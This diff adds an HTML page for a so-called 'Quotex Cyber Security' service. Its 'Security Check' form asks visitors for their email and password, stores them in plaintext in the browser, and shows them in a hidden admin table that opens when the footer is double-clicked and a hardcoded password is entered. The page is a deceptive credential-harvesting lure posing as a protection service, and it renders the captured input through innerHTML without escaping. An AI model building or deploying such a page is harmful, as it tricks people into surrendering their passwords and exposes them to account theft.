@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quotex Cyber Security</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f172a;
+            color: #e5e7eb;
+            line-height: 1.6;
+        }
+        header {
+            background: #111827;
+            text-align: center;
+            padding: 40px 20px;
+            border-bottom: 3px solid #22c55e;
+        }
+        .logo { 
+            width: 420px; 
+            max-width: 95%; 
+            margin-bottom: 10px;
+            border-radius: 10px;
+        }
+        h1 { 
+            color: #22c55e; 
+            margin: 10px 0; 
+            font-size: 36px; 
+        }
+
+        .container { max-width: 800px; margin: 40px auto; padding: 0 20px; }
+
+        .box {
+            background: #111827;
+            padding: 35px;
+            border-radius: 15px;
+            border: 2px solid #22c55e;
+            margin-bottom: 40px;
+        }
+        input, button, label {
+            margin: 10px 0;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #1e2937;
+            border: 1px solid #475569;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #22c55e;
+            color: black;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover { background: #16a34a; }
+
+        .success { display: none; padding: 25px; background: #0b1220; border: 1px solid #22c55e; border-radius: 8px; text-align: center; }
+        .about, .contact {
+            background: #111827;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #1f2937;
+            margin-bottom: 30px;
+        }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #334155; }
+        th { background: #0f172a; color: #22c55e; }
+        footer { text-align: center; padding: 30px; border-top: 1px solid #1f2937; margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="quotex-logo.png" class="logo" alt="Quotex Cyber Security">
+    <h1>QUOTEX CYBER SECURITY</h1>
+    <p>Protecting Your Digital World</p>
+</header>
+
+<div class="container">
+    <div class="box">
+        <h2 style="text-align:center; color:#22c55e; margin-bottom:25px;">SECURITY CHECK</h2>
+        
+        <div id="form">
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="password" id="password" placeholder="Password">
+            <label style="display:block; margin:15px 0; font-size:15px;">
+                <input type="checkbox" id="consent"> I agree to terms & conditions
+            </label>
+            <button onclick="submitForm()">Start Security Check</button>
+        </div>
+
+        <div class="success" id="success">
+            <h3 style="color:#22c55e;">✓ Request Submitted Successfully!</h3>
+            <p>We will contact you soon.</p>
+        </div>
+    </div>
+
+    <div class="about">
+        <h2 style="color:#22c55e; margin-bottom:15px;">ABOUT US</h2>
+        <p>Quotex Cyber Security provides cybersecurity awareness, online safety education, and digital protection guidance to help users stay secure in the modern digital world.</p>
+    </div>
+
+    <div class="contact">
+        <h2 style="color:#22c55e; margin-bottom:15px;">CONTACT / COMPLAINT</h2>
+        <p><strong>Gmail:</strong> quotexcybersecurity@gmail.com</p>
+        <p>For any complaint or inquiry, please email us.</p>
+    </div>
+
+    <div id="admin" style="display:none; background:#1e293b; padding:25px; border-radius:12px;">
+        <h3 style="color:#22c55e; text-align:center;">Admin Logs Panel</h3>
+        <table>
+            <thead><tr><th>Email</th><th>Password</th></tr></thead>
+            <tbody id="tableBody"></tbody>
+        </table>
+    </div>
+</div>
+
+<footer>
+    <p ondblclick="showAdmin()" style="cursor: pointer;">© 2026 Quotex Cyber Security. All Rights Reserved.</p>
+</footer>
+
+<script>
+function submitForm() {
+    let email = document.getElementById("email").value.trim();
+    let pass = document.getElementById("password").value.trim();
+    let consent = document.getElementById("consent").checked;
+
+    if (email === "" || pass === "") return alert("Email aur Password dono dalo");
+    if (!consent) return alert("Consent tick karo");
+
+    let logs = JSON.parse(localStorage.getItem("logs")) || [];
+    logs.push({email, password: pass});
+    localStorage.setItem("logs", JSON.stringify(logs));
+
+    document.getElementById("form").style.display = "none";
+    document.getElementById("success").style.display = "block";
+}
+
+function showAdmin() {
+    let pwd = prompt("Enter Admin Password:");
+    if (pwd === "abdullah@555") {
+        document.getElementById("admin").style.display = "block";
+        loadTable();
+    } else {
+        alert("Wrong Password");
+    }
+}
+
+function loadTable() {
+    let logs = JSON.parse(localStorage.getItem("logs")) || [];
+    let tbody = document.getElementById("tableBody");
+    tbody.innerHTML = logs.map(item => `
+        <tr>
+            <td>${item.email}</td>
+            <td style="color:#f87171;">${item.password}</td>
+        </tr>`).join('');
+}
+</script>
+
+</body>
+</html>
